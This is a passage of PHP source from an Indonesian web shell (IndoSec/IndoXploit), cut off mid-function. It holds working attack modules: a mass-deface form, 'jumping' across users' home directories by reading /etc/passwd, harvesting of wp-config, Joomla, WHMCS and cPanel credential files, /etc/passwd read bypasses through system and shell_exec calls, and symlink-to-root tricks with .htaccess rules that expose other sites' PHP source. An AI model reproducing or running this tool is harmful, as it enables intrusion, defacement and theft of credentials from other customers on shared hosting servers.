				<input type='text' name='d_file' autocomplete='off' placeholder='[Ex] index.php' class='form-control'><br/>
				<h5><i class ='fa fa-file'></i> Isi File :</h5>
				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { IndoSec }'></textarea><br/>
				<input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
			</form>";
		}
		exit;
	}



	/* 
		* Jumping
		* IndoXploit
	*/
	if($_GET['aksi'] == 'jumping') {
		$i = 0;
		echo "<div class='card container'>";
		if(preg_match("/hsphere/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$url = str_replace(array("http://","www."), "", strtolower($url));
					$etc = "/etc/passwd";
					$f = fopen($etc,"r");
					while($gets = fgets($f)) {
						$pecah = explode(":", $gets);
						$user = $pecah[0];
						$dir_user = "/hsphere/local/home/$user";
						if(is_dir($dir_user) === true) {
							$url_user = $dir_user."/".$url;
							if(is_readable($url_user)) {
								$i++;
								$jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
								if(is_writable($url_user)) {
									$jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
								}
								echo $jrw."<br>";
							}
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)) {
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
					  </form></center>';
			}
		} elseif(preg_match("/vhosts/", $dir)) {
			$urls = explode("\r\n", $_POST['url']);
			if(isset($_POST['jump'])) {
				echo "<pre>";
				foreach($urls as $url) {
					$web_vh = "/var/www/vhosts/$url/httpdocs";
					if(is_dir($web_vh) === true) {
						if(is_readable($web_vh)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							if(is_writable($web_vh)) {
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
			} else {
				echo '<center>
					  <form method="post">
					  List Domains: <br>
					  <textarea name="url" class="form-control">';
					  bing("ip:$ip");
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">

					  </form></center>';
			}
		} else {
			echo "<pre>";
			$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
			while($passwd = fgets($etc)) {
				if($passwd == '' || !$etc) {
					echo "<font color=red>Can't read /etc/passwd</font><br/>";
				} else {
					preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
					foreach($user_jumping[1] as $user_pro_jump) {
						$user_jumping_dir = "/home/$user_pro_jump/public_html";
						if(is_readable($user_jumping_dir)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							if(is_writable($user_jumping_dir)) {
								$jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							}
							echo $jrw;
							if(function_exists('posix_getpwuid')) {
								$domain_jump = file_get_contents("/etc/named.conf");
								if($domain_jump == '') {
									echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
									foreach($domains_jump[1] as $dj) {
										$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_jumping_url = $user_jumping_url['name'];
										if($user_jumping_url == $user_pro_jump) {
											echo " => ( <u>$dj</u> )<br>";
											break;
										}
									}
								}
							} else {
								echo "<br>";
							}
						}
					}
				}
			}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
		}
		echo "</div><br/>";
		exit;
	}

	/*
		Config
	*/
	if($_GET['aksi'] == 'config') {
		if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("indosec_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("indosec_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_con) {
			$user_config_dir = "/home/$user_con/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_con/.my.cnf" => "cpanel",
							"/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_con/public_html/forum/config.php" => "phpBB",
							"/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_con/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_con/public_html/admin/config.php" => "OpenCart",
							"/home/$user_con/public_html/application/config/database.php" => "Ellislab",
							"/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
							"/home/$user_con/public_html/inc/config.php" => "MyBB",
							"/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
							"/home/$user_con/public_html/inc/conf_global.php" => "IPB",
							"/home/$user_con/public_html/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
							"/home/$user_con/public_html/configuration.php" => "Joomla",
							"/home/$user_con/public_html/blog/configuration.php" => "Joomla",
							"/home/$user_con/public_html/submitticket.php" => "^WHMCS",
							"/home/$user_con/public_html/cms/configuration.php" => "Joomla",
							"/home/$user_con/public_html/beta/configuration.php" => "Joomla",
							"/home/$user_con/public_html/portal/configuration.php" => "Joomla",
							"/home/$user_con/public_html/site/configuration.php" => "Joomla",
							"/home/$user_con/public_html/main/configuration.php" => "Joomla",
							"/home/$user_con/public_html/home/configuration.php" => "Joomla",
							"/home/$user_con/public_html/demo/configuration.php" => "Joomla",
							"/home/$user_con/public_html/test/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v1/configuration.php" => "Joomla",
							"/home/$user_con/public_html/v2/configuration.php" => "Joomla",
							"/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_con/public_html/new/configuration.php" => "Joomla",
							"/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BUY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
							"/home/$user_con/public_html/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
							"/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
							"/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
							"/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("indosec_config/$user_con-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<p class='text-center'>Success Get Config!!</p>
			<a href='?dir=$dir/indosec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
		}else{
			
			echo "<form method='post'>
				<p class='text-danger'>/etc/passw error ?  <a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a></p>
				<textarea name='passwd' class='form-control' rows='10'>".file_get_contents('/etc/passwd')."</textarea><br/>
				<input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>";
        }
		exit;
	}
	
	
	
	/*
		Bypass etc/passwd
	*/
	if($_GET['aksi'] == 'passwbypass') {
		echo '<div claas="container">
			<form method="POST">
				<p class="text-center">Bypass etc/passwd With :</p>
				<div class="d-flex justify-content-center flex-wrap">
					<input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
					<input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
					<input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
					<input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
					<input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
				</div><hr/>
				<p class="text-center">Bypass User With :</p>
				<div class="d-flex justify-content-center flex-wrap">
					<input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
					<input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
					<input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">	
					<input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">		
					<input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
				</div>
			</form>';
			
			$mail = 'ls /var/mail';
			$paswd = '/etc/passwd';
			
			if($_POST['syst']) {
				echo"<textarea class='form-control' rows='13'>";
				echo system("cat $paswd");
				echo"</textarea><br/>";
			}
			if($_POST['passth']) {
				echo"<textarea class='form-control' rows='13'>";
				echo passthru("cat $paswd");
				echo"</textarea><br/>";
			}
			if($_POST['ex']) {
				echo"<textarea class='form-control' rows='13'>";
				echo exec("cat $paswd;");
				echo"</textarea><br/>";
			}
			if($_POST['shex']) {
				echo"<textarea class='form-control' rows='13'>";
				echo shell_exec("cat $paswd");
				echo"</textarea><br/>";
			}
			if($_POST['melex']) {
				echo"<textarea class='form-control' rows='13'>";
				for($uid=0;$uid<60000;$uid++){ 
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list ($key, $val) = each($ara)){
							print "$val:";
						}
						print "n";
					}
				}
				echo"</textarea><br/>";
			}
			
			if ($_POST['awkuser']) {
				echo"<textarea class='form-control' rows='13'>
				".shell_exec("awk -F: '{ print $1 }' $paswd | sort")."
				</textarea><br/>";
			}
			if ($_POST['systuser']) {
				echo"<textarea class='form-control' rows='13'>";
				echo system("$mail");
				echo "</textarea><br>";
			}
			if ($_POST['passthuser']) {
				echo"<textarea class='form-control' rows='13'>";
				echo passthru("$mail");
				echo "</textarea><br>";
			}
			if ($_POST['exuser']) {
				echo"<textarea class='form-control' rows='13'>";
				echo exec($mail);
				echo "</textarea><br>";
			}
			if ($_POST['shexuser']) {
				echo"<textarea class='form-control' rows='13'>";
				echo shell_exec("$mail");
				echo "</textarea><br>";
			}
		echo "</div>";
		exit;
	}
	
	
	/*
		Adminer
	*/
	if($_GET['aksi'] == 'adminer') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		function adminer($url, $isi) {
			$fp = fopen($isi, "w");
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, $fp);
			return curl_exec($ch);
			curl_close($ch);
			fclose($fp);
			ob_flush();
			flush();
		}
		if(file_exists('adminer.php')) {
			echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
		} else {
			if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
				echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
			} else {
				echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
			}
		}
		exit;
	}


	/*
		Symlink
	*/
	if($_GET['aksi'] == 'symlink') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
		$d0mains = @file("/etc/named.conf");
		if(!$d0mains) {
			die ("[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
		}
		##htaccess
		if($d0mains){
			@mkdir("indsc_sym",0777);
			@chdir("indsc_sym");
			@exe("ln -s / root");
			$file3 = 'Options Indexes FollowSymLinks
			DirectoryIndex indsc.html
			AddType text/plain .php
			AddHandler text/plain .php
			Satisfy Any';
			$fp3 = fopen('.htaccess','w');
			$fw3 = fwrite($fp3,$file3);@fclose($fp3);
			echo "[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]
			<div class='tmp'>
			<table class='text-center table-responsive'>
				<thead class='bg-info'>
					<th>No.</th>
					<th>Domains</th>
					<th>Users</th>
					<th>symlink </th>
				</thead>";
				$dcount = 1;
				foreach($d0mains as $d0main){
					if(eregi("zone",$d0main)){
						preg_match_all('#zone "(.*)"#', $d0main, $domains);
						flush();
						if(strlen(trim($domains[1][0])) > 2){
							$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
							echo "<tr>
								<td>".$dcount."</td>
								<td class='text-left'><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td>
								<td>".$user['name']."</td>
								<td><a href='$full/indsc_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
							</tr>";
							flush();
							$dcount++;
						}
					}
				}
			echo "</table></div>";
		}else{
			$TEST=@file('/etc/passwd');
			if ($TEST){
				@mkdir("indsc_sym",0777);
				@chdir("indsc_sym");
				@exe("ln -s / root");
				$file3 = 'Options Indexes FollowSymLinks
				DirectoryIndex indsc.html
				AddType text/plain .php
				AddHandler text/plain .php
				Satisfy Any';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);
				@fclose($fp3);
				echo "[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]
				<div class='tmp'>
				<table class='text-center table-responsive'>
					<thead class='bg-warning'>
						<th>No.</th>
						<th>Users</th>
						<th>symlink </th>
					</thead>";
					$dcount = 1;
					$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
					while(!feof($file)){
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
						echo "<tr>
							<td>".$dcount."</td>
							<td>".$matches."</td>
							<td><a href=$full/indsc_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
						</tr>";
						$dcount++;
					}
					fclose($file);
				echo "</table></div>";
			}else{
			if($os != "Windows"){
				@mkdir("indsc_sym",0777);
				@chdir("indsc_sym");
				@exe("ln -s / root");
				$file3 = 'Options Indexes FollowSymLinks
				DirectoryIndex indsc.html
				AddType text/plain .php
				AddHandler text/plain .php
				Satisfy Any';
				$fp3 = fopen('.htaccess','w');
				$fw3 = fwrite($fp3,$file3);@fclose($fp3);
				echo "[ <a href='?dir=$path&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$path&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$path&aksi=sym_bypas'>Symlink Bypass</a> ]
				<div class='tmp'>
				<table class='text-center table-responsive'>
					<thead class='bg-danger'>
						<th>ID.</th>
						<th>Users</th>
						<th>symlink </th>
					</thead>";
					$temp = "";$val1 = 0;$val2 = 1000;
					for(;$val1 <= $val2;$val1++){
						$uid = @posix_getpwuid($val1);
						if ($uid)$temp .= join(':',$uid)."\n";
					}
					echo '<br/>';$temp = trim($temp);
					$file5 = fopen("test.txt","w");
					fputs($file5,$temp);
					fclose($file5);$dcount = 1;$file =
					fopen("test.txt", "r") or exit("Unable to open file!");
					while(!feof($file)){
						$s = fgets($file);$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
						continue;
						echo "<tr>
							<td>".$dcount."</td>
							<td>".$matches."</td>
							<td><a href=$full/indsc_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
						</tr>";
						$dcount++;
					}
					fclose($file);
				echo "</table></div>";
				unlink("test.txt");
				}
			}
		}
		exit;
	}

	if($_GET['aksi'] == 'symread') {
		echo "read /etc/named.conf";
		echo "<form method='post' action='?dir=$dir&aksi=symread&save=1'>
			<textarea class='form-control' rows='8' name='file'>";
			flush();
			flush();
			$file = '/etc/named.conf';
			$r3ad = @fopen($file, 'r');
			if ($r3ad){
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
		}else if (!$r3ad) {
			$r3ad = @show_source($file) ;
		}else if (!$r3ad) {
			$r3ad = @highlight_file($file);
		}else if (!$r3ad) {
			$sm = @symlink($file,'sym.txt');
			if ($sm){
				$r3ad = @fopen('sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
		echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
		if(isset($_GET['save'])){
			$cont = stripcslashes($_POST['file']);
			$f = fopen('named.txt','w');
			$w = fwrite($f,$cont);
			if($w){
				echo '<br/>save has been successfully';
			}
			fclose($f);
		}
		exit;
	}
	
	if ($_GET['aksi'] == 'sym_404'){
		echo '<h2>Symlink 404</h2>
		<form method="post">
			File Target: <input type="text" class="form-control" name="dir" value="/home/user/public_html/wp-config.php"><br>
			Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
			<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
		</form>';
		if($_POST['execute']){
			rmdir("indosec_sym404");
			mkdir("indosec_sym404", 0777);
			$dir = $_POST['dir'];
			$isi = $_POST['isi'];
			system("ln -s ".$dir."indosec_sym404/".$isi);
			symlink($dir,"indosec_sym404/".$isi);
			$inija = fopen("indosec_sym404/.htaccess", "w");
			fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
			echo'<a href="/indosec_sym404/" target="_blank"> >>Sukses<< </a>';
		}
		exit;
	}
	
	
	if ($_GET['aksi'] == 'sym_bypas'){
		if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
			$cont = stripcslashes($_POST['file']);
			if(!file_exists('passwd.txt')){
				$f = @fopen('passwd.txt','w');
				$w = @fwrite($f,$cont);
				fclose($f);
			}
			if($w or @filesize('passwd.txt') > 0){
				echo "<div class='tmp'>
